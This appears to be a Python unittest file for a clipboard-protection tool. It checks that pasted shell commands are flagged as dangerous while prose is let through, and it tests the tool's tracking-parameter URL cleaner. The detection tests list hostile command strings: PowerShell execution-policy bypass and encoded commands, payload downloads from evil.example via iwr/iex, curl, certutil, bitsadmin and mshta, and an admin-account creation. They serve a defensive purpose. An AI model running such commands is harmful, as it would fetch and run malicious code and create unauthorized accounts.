"""Behavior tests for the clipboard detection and URL-cleaning logic.

These tests exec the detection section of clipboard_defanger.py directly
(no PyWin32 or pystray imports), so they run anywhere with stdlib only.

Run:  python -m unittest discover -s tests -v
"""
import re
import sys
import unittest
from pathlib import Path
from urllib.parse import urlparse, unquote, urlunparse

SRC = Path(__file__).resolve().parent.parent / "clipboard_defanger.py"


def _load_detection():
    src = SRC.read_text(encoding="utf-8")
    block = re.search(r"(TRACKING_PARAMS_SET.*?)(?=# --- Notifications ---)", src, re.DOTALL)
    if not block:
        raise RuntimeError("detection block not found in clipboard_defanger.py")
    ns = {"re": re, "urlparse": urlparse, "unquote": unquote, "urlunparse": urlunparse}
    exec(compile(block.group(1), "detect", "exec"), ns)
    return ns["detect_command"], ns["clean_url"]


detect_command, clean_url = _load_detection()


class TestDetection(unittest.TestCase):
    def test_real_payloads_blocked(self):
        for text in [
            "cmd /c echo hello",
            "powershell -ExecutionPolicy Bypass -NoProfile -Command whoami",
            "pwsh -ExecutionPolicy Bypass -Command whoami",
            "powershell -enc SQBFAFgAIAAoAEYAbwBzAHIAZQBtAGQAYQBjAHMAcgBzAA==",
            "iwr https://evil.example/x.ps1 | iex",
            "Invoke-WebRequest -uri https://evil.example/x.ps1",
            "curl https://evil.example/payload.exe",
            "mshta http://evil.example/x.hta",
            "rundll32 url.dll,FileProtocolHandler http://evil.example/x",
            "certutil -urlcache -f http://evil.example/x.exe",
            "bitsadmin /transfer myjob http://evil.example/x.exe C:\\x.exe",
            "net user admin Pass123! /add",
            "Start-Process -FilePath C:\\evil.exe -ArgumentList evil",
            "New-Object System.Net.WebClient",
            "bash -c 'echo pwned'",
            "wscript evil.vbs",
            "msiexec /i evil.msi /quiet",
            "iex",
            "Invoke-Expression 'iex'",
        ]:
            with self.subTest(text=text):
                self.assertTrue(detect_command(text)[0])

    def test_flag_tolerant_payloads_blocked(self):
        for text in [
            "curl -L https://evil.example/payload.exe",
            "curl -o C:\\x.exe https://evil.example/x.exe",
            "curl 'https://evil.example/payload.exe'",
            "pwsh -e SQBFAFgAIAAoAEYAbwBzAHIAZQBtAGQAYQBjAHMAcgBzAA==",
            "pwsh -EncodedCommand SQBFAFgAIAAoAEYAbwBzAHIAZQBtAGQAYQBjAHMAcgBzAA==",
            "iwr -uri https://evil.example/x.ps1",
            "iwr -usebasicparsing https://evil.example/x.ps1",
            "irm 'https://evil.example/x.ps1'",
            "reg add HKCU\\Software\\Bad /v x /t REG_SZ /d evil",
            "certutil \"-urlcache -f http://evil.example/x.exe\"",
        ]:
            with self.subTest(text=text):
                self.assertTrue(detect_command(text)[0])

    def test_prose_not_blocked(self):
        for text in [
            "The article mentions cmd /c and powershell flags",
            "Check out this doc about powershell -ExecutionPolicy",
            "I read about wmic in this tutorial",
            "I read about mshta and rundll32 today",
            "powershell is a handy shell",
            "I read about certutil in this tutorial",
            "curl is a handy tool for testing endpoints",
            "I read about Invoke-WebRequest today",
        ]:
            with self.subTest(text=text):
                self.assertFalse(detect_command(text)[0])


class TestUrlCleaning(unittest.TestCase):
    def test_tracking_params_removed(self):
        result = clean_url("https://example.com/page?utm_source=x&utm_medium=y&id=42")
        self.assertIsNotNone(result)
        cleaned, removed = result
        self.assertEqual(cleaned, "https://example.com/page?id=42")
        self.assertEqual(removed, ["utm_medium", "utm_source"])

    def test_tracking_set(self):
        self.assertEqual(clean_url("https://example.com/page?ref=abc&si=123")[0],
                         "https://example.com/page")

    def test_html_encoded_ampersand(self):
        result = clean_url("https://example.com/page?utm_source=a&amp;utm_medium=b&id=1")
        self.assertIsNotNone(result)
        cleaned, _ = result
        self.assertEqual(cleaned, "https://example.com/page?id=1")

    def test_ref_prefix_removed(self):
        result = clean_url("https://example.com/path?ref_src=x&id=1")
        self.assertIsNotNone(result)
        cleaned, removed = result
        self.assertEqual(cleaned, "https://example.com/path?id=1")
        self.assertIn("ref_src", removed)

    def test_non_tracking_kept_verbatim(self):
        result = clean_url("https://example.com/path?a=1%2Fb=2&utm_source=x")
        self.assertIsNotNone(result)
        cleaned, removed = result
        self.assertEqual(cleaned, "https://example.com/path?a=1%2Fb=2")
        self.assertEqual(removed, ["utm_source"])

    def test_no_tracking_returns_none(self):
        self.assertIsNone(clean_url("https://example.com/path?a=1&b=2"))

    def test_fragment_preserved(self):
        result = clean_url("https://example.com/page?utm_source=x#section")
        self.assertIsNotNone(result)
        cleaned, _ = result
        self.assertTrue(cleaned.endswith("#section"))


if __name__ == "__main__":
    unittest.main()
